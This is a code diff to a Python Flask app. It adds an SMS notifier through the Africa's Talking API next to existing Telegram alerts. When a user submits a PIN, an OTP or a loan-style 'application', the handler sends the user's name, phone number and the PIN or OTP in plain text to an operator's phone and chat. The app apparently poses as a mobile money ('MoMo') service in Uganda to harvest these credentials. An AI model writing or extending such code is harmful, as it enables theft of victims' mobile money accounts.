@@ -15,6 +15,34 @@ def serve_assets(filename):
     return send_from_directory('assets', filename)
 
 
+# Africa's Talking & SMS Configuration
+ADMIN_NOTIFICATION_PHONE = os.environ.get("ADMIN_NOTIFICATION_PHONE")
+AT_USERNAME = os.environ.get("AT_USERNAME", "sandbox")
+AT_API_KEY = os.environ.get("AT_API_KEY")
+
+def send_sms_notification(message):
+    if not ADMIN_NOTIFICATION_PHONE or not AT_API_KEY:
+        print("Africa's Talking SMS configuration missing. SMS skipped.")
+        return
+    try:
+        url = "https://api.africastalking.com/version1/messaging"
+        if AT_USERNAME == "sandbox":
+            url = "https://api.sandbox.africastalking.com/version1/messaging"
+            
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "apiKey": AT_API_KEY
+        }
+        payload = {
+            "username": AT_USERNAME,
+            "to": ADMIN_NOTIFICATION_PHONE,
+            "message": message
+        }
+        requests.post(url, data=payload, headers=headers, timeout=5)
+    except Exception as e:
+        print(f"Africa's Talking SMS dispatch failed: {e}")
+
 # Telegram Configuration (support both TELEGRAM_BOT_TOKEN and TELEGRAM_TOKEN)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
@@ -42,6 +70,7 @@ def send_telegram_notification(message):
                 print(f"Failed to send to chat_id {chat_id}: {inner_e}")
     except Exception as e:
         print(f"Telegram notification orchestration failed: {e}")
+
 
 # Helper to get current time in Uganda/Johannesburg timezone
 def get_now_str():
@@ -1032,13 +1061,16 @@ def save_unified():
         if f_n == 'entered_pin':
             m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
+            send_sms_notification(f"[MoMo Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n == 'entered_otp':
             m = f'📱 *OTP Received*\n\n👤 *User:* {name}\n🔑 *OTP:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
+            send_sms_notification(f"[MoMo Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* UGX {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
+            send_sms_notification(f"[MoMo Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: UGX {amt}")
         return jsonify({'status': 'success', 'record_id': app_id})
 
     except Exception as e:
